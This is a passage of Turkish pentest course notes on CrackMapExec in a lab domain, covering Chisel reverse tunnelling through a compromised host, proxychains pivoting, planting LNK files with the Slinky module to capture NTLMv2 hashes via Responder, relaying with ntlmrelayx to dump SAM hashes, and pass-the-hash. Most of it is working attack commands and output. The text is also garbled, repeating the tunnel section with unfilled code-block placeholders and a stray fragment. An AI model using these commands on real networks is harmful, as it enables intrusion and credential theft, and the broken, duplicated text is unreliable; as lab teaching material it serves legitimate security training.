 MAX_FILE_SIZE Max file size allowed to dump (Default:
51200)
 OUTPUT_FOLDER Path of the remote folder where the dump
will occur (Default: /tmp/cme_spider_plus)

```

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

```
wget
https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_l
inux_amd64.gz -O chisel.gz -q

gunzip -d chisel.gz

chmod +x chisel

./chisel server --reverse

2022/11/06 10:57:00 server: Reverse tunnelling enabled
2022/11/06 10:57:00 server: Fingerprint
CelKxt2EsL1SUFnvo634FucIOPqlFKQJi8t/aTjRfWo=
2022/11/06 10:57:00 server: Listening on http://0.0.0.0:8080
```


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

```
wget
https://github.com/jpillora/chisel/releases/download/v1.7.7/chisel_1.7.7_w
indows_amd64.gz -O chisel.exe.gz -q

gunzip -d chisel.exe.gz

crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! --put-file
./chisel.exe \\Windows\\Temp\\chisel.exe

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [*] Copy ./chisel.exe
to \Windows\Temp\chisel.exe
SMB 10.129.204.133 445 MS01 [+] Created file
./chisel.exe on \\C$\\Windows\Temp\chisel.exe

```


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x "C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

```
./chisel server --reverse
<SNIP>
2022/11/06 10:57:54 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks:
Listening

```

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

```
netstat -lnpt | grep 1080
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
tcp 0 0 127.0.0.1:1080 0.0.0.0:* LISTEN
446306/./chisel
```

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

```
cat /etc/proxychains.conf
<SNIP>
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks5 127.0.0.1 1080
```

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

```
proxychains crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:135 ...
OK
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
[proxychains] Strict chain ... 127.0.0.1:1080 ... 172.16.1.10:445 ...
OK
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
SMB 172.16.1.10 445 DC01 C$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 carlos
SMB 172.16.1.10 445 DC01 D$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 david
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
READ,WRITE
SMB 172.16.1.10 445 DC01 john
SMB 172.16.1.10 445 DC01 julio
SMB 172.16.1.10 445 DC01 linux01
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 svc_workstations
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share
```


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
--shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
SMB 172.16.1.10 445 DC01 C$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 carlos
SMB 172.16.1.10 445 DC01 D$
READ,WRITE Default share
SMB 172.16.1.10 445 DC01 david
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
READ,WRITE
SMB 172.16.1.10 445 DC01 john
SMB 172.16.1.10 445 DC01 julio
SMB 172.16.1.10 445 DC01 linux01
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 svc_workstations
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share
```

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -X "StopProcess -Name chisel -Force"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
```

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x
"C:\Windows\Temp\chisel.exe client 10.10.14.33:8080 R:socks"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
SMB 10.129.204.133 445 MS01 [+] Executed command
SMB 10.129.204.133 445 MS01 2022/11/07 06:26:10
client: Connecting to ws://10.10.14.33:8080
SMB 10.129.204.133 445 MS01 2022/11/07 06:26:11
client: Connected (Latency 125.6629ms)
```

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Üzerinde Chisel'i Kapatma

```
./chisel server --reverse
2022/12/08 16:43:17 server: Reverse tunnelling enabled
2022/12/08 16:43:17 server: Fingerprint
NVnBjtu2DPIuQPxLU0YdcyZhRKc+Myi3ojPzo0T2frQ=
2022/12/08 16:43:17 server: Listening on http://0.0.0.0:8080
2022/12/08 16:44:21 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks:
Listening
^C

```


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak başlatarak ve saldırı hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak başlatmak için `server --socks5` seçeneğini kullanacağız.


### Chisel'i Hedef Makinede Sunucu Olarak Başlatma

```
crackmapexec smb 10.129.204.133 -u grace -p Inlanefreight01! -x
"C:\Windows\Temp\chisel.exe server --socks5"

SMB 10.129.204.133 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 10.129.204.133 445 MS01 [+]
inlanefreight.htb\grace:Inlanefreight01! (Pwn3d!)
```

Şimdi hedef makinemiz Chisel sunucusuna bağlanmak ve proxy'yi etkinleştirmek için IP ve porttan sonra `socks` seçeneğini kullanmamız gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna Bağlanma

```
sudo chisel client 10.129.204.133:8080 socks
2022/11/22 06:56:01 client: Connecting to ws://10.129.204.133:8080
2022/11/22 06:56:01 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 06:56:02 client: Connected (Latency 124.871246ms)
```

Şimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e Bağlanmak için Proxy Chain'i Kullanma

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$ READ
Remote Admin
<SNIP>

```

Bu bölümde, **attack host** üzerinde **Proxychains** ve **Chisel** yapılandırmayı ve **CrackMapExec** kullanarak hedef makinede **Chisel** çalıştırmayı öğrendik.

İlerleyen bölümlerde, diğer ağlara ulaşmak için `CrackMapExec` ve `Proxychains` kullanacağız.

---

### Stealing Hashes

Yeni hesapları ele geçirmek için kullanılan en yaygın tekniklerden biri parola hashlerinin çalınmasıdır. Bunu başarmanın farklı yöntemleri vardır, ancak yaygın olanı, bir bilgisayarı veya kullanıcıyı kontrol ettiğimiz sahte bir paylaşılan klasörle bir kimlik doğrulama işlemi başlatmaya zorlamaktır.

Bu kimlik doğrulama işlemini başlatırken, kullanıcı veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araç kullanılarak kırılabilir veya kimlik bilgilerini bilmeden kullanıcının kimliğine bürünmek için başka bir bilgisayara iletilebilir.

Paylaşılan klasörleri kullanarak hash'leri çalmak için bir kısayol oluşturabilir ve kısayolda görünen simge sahte paylaşılan klasörümüzü gösterecek şekilde yapılandırabiliriz. Kullanıcı paylaşılan klasöre girdiğinde, simgenin konumunu aramaya çalışacak ve paylaşılan klasörümüze karşı kimlik doğrulamasını zorlayacaktır.

NTLMv2 hash'lerini toplama hakkında daha fazla bilgi edinmek için RedTeam Ekipler için [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadı](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kısayolların kullanımını değil, aynı amaca hizmet eden diğer dosya türlerini de gösterir.


### Slinky Modülü

`Slinky`, [@byt3bl33d3r](https://twitter.com/byt3bl33d3r) tarafından oluşturulan bir modüldür ve CME'deki en heyecan verici modüllerden biridir. Prensip basittir. Modül, yazma izinlerine sahip tüm paylaşımlarda belirtilen SMB sunucusuna bir UNC yolu içeren simge attribute'a sahip Windows kısayolları oluşturur. Birisi paylaşımı ziyaret ettiğinde, simge attribute'u sunucumuza giden bir UNC yolu içerdiği için `Responder` kullanarak NTLMv2 hash'ini alacağız.

Modülün `SERVER` ve `NAME` olmak üzere iki zorunlu seçeneği ve bir isteğe bağlı `CLEANUP` seçeneği vardır.


### Slinky Module Options

```
crackmapexec smb -M slinky --options
[*] slinky module options:
 SERVER IP of the SMB server
 NAME LNK file nametest
 CLEANUP Cleanup (choices: True or False)

```

`SERVER`, kontrol ettiğimiz SMB sunucusunun IP'sine ve UNC yolunun işaret etmesini istediğimiz yere karşılık gelir. `NAME` seçeneği kısayol dosyasına bir isim atar, `CLEANUP` ise işimiz bittiğinde kısayolu silmek içindir.


### Chisel kullanarak bağlama

Bu alıştırma için lokal erişimi simüle edeceğiz ve internal ağa bağlanmak için Chisel ve Proxychains kullanacağız. Chisel zaten hedef makinemizde bir sunucu olarak çalışıyor ve bir client olarak bağlanmamız ve daha sonra internal ağı numaralandırmak için proxychains kullanmamız gerekiyor. Chisel kullanarak bağlanmak için aşağıdaki komutu **kullanalım**


### Hedef Makine Chisel Sunucusuna Bağlanma

```
sudo chisel client 10.129.204.133:8080 socks
2022/11/22 07:15:52 client: Connecting to ws://10.129.204.133:8080
2022/11/22 07:15:52 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/11/22 07:15:53 client: Connected (Latency 125.541725ms)

```


### NTLMv2 Hash'lerinin Çalınması
İlk olarak, `--shares` seçeneğini kullanarak `grace` kullanıcısının `WRITE` ayrıcalıklarına sahip olduğu bir paylaşım bulalım:

### WRITE Ayrıcalıklarına Sahip Paylaşımları Bulma

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01! --shares

SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SMB 172.16.1.10 445 DC01 [+] Enumerated shares
SMB 172.16.1.10 445 DC01 Share
Permissions Remark
SMB 172.16.1.10 445 DC01 ----- ------
----- ------
SMB 172.16.1.10 445 DC01 ADMIN$
Remote Admin
SMB 172.16.1.10 445 DC01 C$
Default share
SMB 172.16.1.10 445 DC01 D$
Default share
SMB 172.16.1.10 445 DC01 flag READ
SMB 172.16.1.10 445 DC01 HR
READ,WRITE
SMB 172.16.1.10 445 DC01 IPC$ READ
Remote IPC
SMB 172.16.1.10 445 DC01 IT
SMB 172.16.1.10 445 DC01 IT-Tools
READ,WRITE
SMB 172.16.1.10 445 DC01 NETLOGON READ
Logon server share
SMB 172.16.1.10 445 DC01 SYSVOL READ
Logon server share

```


Gördüğümüz gibi, `grace` `HR` ve `IT-Tools` paylaşımlarına yazabilir. Bu nedenle her bir paylaşıma bir `LNK` dosyası yazmak için `Slinky` modülünü kullanabiliriz. 

**SERVER=10.10.14.33** seçeneğini kullanarak **attack host**'umuzun **tun0** ağındaki **IP adresini** belirteceğiz ve **NAME=important** seçeneğiyle **LNK dosyasına atanacak dosya adını** belirleyeceğiz.


### Using Slinky

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
-M slinky -o SERVER=10.10.14.33 NAME=important

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: HR
SLINKY 172.16.1.10 445 DC01 [+] Created LNK file
on the HR share
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
SLINKY 172.16.1.10 445 DC01 [+] Created LNK file
on the IT-Tools share
```


![Pasted image 20241202171933.png](/img/user/resimler/Pasted%20image%2020241202171933.png)

**Not:** **CrackMapExec**, genellikle **`OpSec` açısından güvenli** olarak kabul edilir çünkü tüm işlemler ya **`bellekte` çalıştırılır**, ya **`WinAPI` çağrılarıyla ağ üzerinden sorgulanır**, ya da **Windows'un built-in araçları/özellikleri** kullanılarak gerçekleştirilir.

Bu gereksinimleri karşılamayan bir modül çalıştırmaya çalıştığımızda, **önceden bir uyarı alırız**. **`Slinky`** modülü, **OpSec açısından güvenli olmayan** bir modüle örnektir. Devam etmeden önce **bir uyarı alacağız**.

LNK dosyası oluşturulduktan sonra, Responder'ı çalıştırmamız ve birinin paylaşıma göz atmasını beklememiz gerekir. 


### Starting Responder

```
sudo responder -I tun0
 __
 .----.-----.-----.-----.-----.-----.--| |.-----.----.
 | _| -__|__ --| _ | _ | | _ || -__| _|
 |__| |_____|_____| __|_____|__|__|_____||_____|__|
 |__|
 NBT-NS, LLMNR & MDNS Responder 3.0.6.0
 Author: Laurent Gaffie ([email protected])
 To kill this script, hit CTRL-C
<SNIP>
[+] Listening for events...
[SMB] NTLMv2-SSP Client : 10.129.204.133
[SMB] NTLMv2-SSP Username : INLANEFREIGHT\julio
[SMB] NTLMv2-SSP Hash :
julio::INLANEFREIGHT:6ab02caa0926e456:433DB600379844344ED4D3A073CAF995:010
1000000000000004A2BBF8808D901D4CC1FFAB74CC23F00000000020008004400320058005
60001001E00570049004E002D0030005500510058004E00570046004100550030004400040
03400570049004E002D0030005500510058004E005700460041005500300044002E0044003
200580056002E004C004F00430041004C0003001400440<SNIP>
```

Not: Hash'i yakalamak için `Responder.conf` dosyasında SMB seçeneği `On` olmalıdır.

NTLMv2 hash'imizi aldık ve hesabı kullanmak için onu kırmamız gerekiyor veya bir `NTLM Relay` yapabiliriz. Bunu kırmak için, `ASREPRoast` ve `Kerberoasting` ile yaptığımız gibi `Hashcat mod 5600`'ü kullanabiliriz. `NTLM Relay`'e odaklanalım.


### **NTLM Relay**

Diğer bir çözüm ise NTLMv2 hash'ini doğrudan `SMB Sign`'nın devre dışı bırakıldığı ağdaki diğer sunuculara ve workstation'lara iletmektir. SMB Sign çok önemlidir çünkü bir bilgisayarda SMB Sign etkinse, saldırı hostumuzun kimliğini kanıtlayamayacağımız için o bilgisayara relay yapamayız. SMB Sign'nın devre dışı bırakıldığı hedeflerin bir listesini almak için `--gen-relay-list` seçeneğini kullanabiliriz.

Şimdi Proxychains'i kullanabilir ve SMB Sign devre dışı bırakılmış makinelerin bir listesini alabiliriz

### Getting Relay List

```
proxychains4 -q crackmapexec smb 172.16.1.0/24 --gen-relay-list relay.txt

SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:inlanefreight.htb) (signing:False)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)

cat relay.txt
172.16.1.5
```


**`ntlmrelayx`** aracını, daha önce **`--gen-relay-list`** seçeneğiyle elde ettiğimiz listeyle birlikte kullanacağız.

Hedef makinede **local administrator** ayrıcalıklarına sahip bir hesap bulursak ve ek seçenekler belirtmezsek, **`ntlmrelayx`** otomatik olarak hedef makinenin **`SAM` database**'ini dump edecektir. Bu sayede, herhangi bir **local admin kullanıcısının hash'leriyle** bir **`pass-the-hash attack`** gerçekleştirmeyi deneyebiliriz.

### Execute NTLMRelayX

```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Running in relay mode to hosts in targetfile
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

Bir kullanıcının **SMB share**'ine erişmesini beklemeliyiz. **LNK dosyamız**, kullanıcının hedef makinemize bağlanmasını zorlar (**bu işlem arka planda gerçekleşir ve kullanıcı herhangi bir anormallik fark etmez**).

Bu gerçekleştiğinde, **`ntlmrelayx`** konsolunda aşağıdakine benzer bir çıktı görmeliyiz:

```
sudo proxychains4 -q ntlmrelayx.py -tf relay.txt -smb2support --no-http

Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth
Corporation
<SNIP>
[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, attacking target smb://172.16.1.5
[*] Authenticating against smb://172.16.1.5 as INLANEFREIGHT/JULIO SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/[email protected]
controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x29fc3535fc09fb37d22dc9f3339f6875
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:30b3783ce2abf1af70f77d0
660cf3453:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c
0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59
d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077a
ee1958e7f78070:::
localadmin:1003:aad3b435b51404eeaad3b435b51404ee:7c08d63a2f48f045971bc2236
ed3f3ac:::
sshd:1004:aad3b435b51404eeaad3b435b51404ee:d24156d278dfefe29553408e826a95f
6:::
htb:1006:aad3b435b51404eeaad3b435b51404ee:6593d8c034bbe9db50e4ce94b1943701
:::
[*] Done dumping SAM hashes for host: 172.16.1.5
[*] Stopping service RemoteRegistry
```

Ardından, administrator hash'ini kullanarak hedef makinede kimlik doğrulaması yapmak için crackmapexec'i kullanabiliriz:

### Local Hesapları Test Etme

```
proxychains4 -q crackmapexec smb 172.16.1.5 -u administrator -H
30b3783ce2abf1af70f77d0660cf3453 --local-auth

SMB 172.16.1.5 445 MS01 [*] Windows 10.0 Build
17763 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:False)
SMB 172.16.1.5 445 MS01 [+]
MS01\administrator:30b3783ce2abf1af70f77d0660cf3453 (Pwn3d!)
```

### Her Şeyi Temizleyin

Modülü kullandıktan sonra, **LNK dosyasını temizlemek** için **`-o CLEANUP=YES`** seçeneğini ve **LNK dosyasının adını** (**`NAME=important`**) belirtmek kritik önem taşır.

### Cleanup

```
proxychains4 -q crackmapexec smb 172.16.1.10 -u grace -p Inlanefreight01!
-M slinky -o NAME=important CLEANUP=YES

[!] Module is not opsec safe, are you sure you want to run this? [Y/n] y
SMB 172.16.1.10 445 DC01 [*] Windows 10.0 Build
17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True)
(SMBv1:False)
SMB 172.16.1.10 445 DC01 [+]
inlanefreight.htb\grace:Inlanefreight01!
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: HR
SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
on the HR share
SLINKY 172.16.1.10 445 DC01 [+] Found writable
share: IT-Tools
SLINKY 172.16.1.10 445 DC01 [+] Deleted LNK file
on the IT-Tools share
```, 'print

Dizine gidebilir ve kullanıcının erişebileceği tüm dosyaların bir listesini alabiliriz:


### Kullanıcının Kullanabileceği Dosyaları Listeleme

{{CODE_BLOCK_94}}

Eğer paylaşımın tüm içeriğini indirmek istiyorsak `READ_ONLY=false` seçeneğini aşağıdaki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: Sabırlı olmamız gerekiyor. Paylaşılan klasör ve dosya sayısına bağlı olarak işlem birkaç dakika sürebilir

`spider_plus` modülü için mevcut tüm seçenekleri görüntülemek için `--options` seçeneğini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bölümde CrackMapExec'in bir `proxy` aracılığıyla diğer ağlara ulaşmak için nasıl kullanılacağı anlatılacaktır.


---

### Proxychains with CME

### Scenario

İnternal bir Pentest üzerinde çalışıyoruz. Bir ağ taraması gerçekleştirdik ve yalnızca bir host (10.129.204.133) tespit edip ele geçirebildik. Ele geçirilen bu host üzerinde `ipconfig` çalıştırdığımızda, iki ağ bağdaştırıcısı olduğunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip başka bir hostu gösteriyor. Topladığımız bilgilere dayanarak aşağıdaki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu ağdaki (172.16.1.0/24) herhangi bir makineye saldırmak için, saldırı hostumuz ile MS01 arasında bir `tünel` kurmalıyız. Bu nedenle, CME tarafından yürütülen tüm komutlar MS01 üzerinden geçer.


### Set Up the Tunnel

Tünelimizi kurmak için [Chisel](https://github.com/jpillora/chisel) kullanacağız. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldıracağımız makinemiz için en son Windows binary'sini ve saldırı hostumuzda kullanmak için en yeni Linux binary'sini indirelim ve aşağıdaki adımları gerçekleştirelim:

*  Chisel'ı Saldırı Hostumuza indirin ve Çalıştırın:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u İndirin ve Hedef Host'a Yükleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yürütme seçeneği `-x`'i kullanarak Chisel sunucumuza bağlanmak için `chisel.exe` dosyasını çalıştırın (Bu seçeneği Komut Yürütme bölümünde daha fazla tartışacağız)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar çalışmaya devam edecektir. Bunu bu bölümde daha sonra yapacağız.

**Attack host** üzerinde, **Chisel server** çıktısında **bir client bağlantısı aldığımızı ve tüneli başlattığımızı** gösteren yeni bir satır görmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediğini kontrol ederek de tünelin çalıştığını doğrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayılan portu `TCP 1080`'i kullanacak şekilde yapılandırmamız gerekir. Yapılandırma dosyasının ProxyList bölümüne `socks5 127.0.0.1 1080`'i aşağıdaki gibi eklediğimizden emin olmamız gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* Artık 172.16.1.10 IP'sine ulaşmak için `Proxychains` aracılığıyla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains çıktısını konsoldan kaldırmak için `Proxychains4` ve `quiet -q` seçeneğini kullanabiliriz:

### Quiet Seçeneği ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracılığıyla herhangi bir CME işlemi gerçekleştirebiliriz.


### Killing Chisel on the Target Machine

İşimiz bittiğinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak için, PowerShell komutlarını yürütmek için `-X` seçeneğini kullanacağız ve PowerShell komutunu çalıştıracağız `Stop-Process - Name chisel -Force .` Komut yürütme konusunu Komut Yürütme bölümünde daha ayrıntılı olarak ele alacağız.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptıktan sonra, Chisel client komutunu çalıştırdığımız terminal aşağıdaki gibi sonuçlanmalıdır:


### Chisel'i Zorla Durdurduktan Sonra Terminalin Kapanması

{{CODE_BLOCK_107}}

Artık saldırı konağımızdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


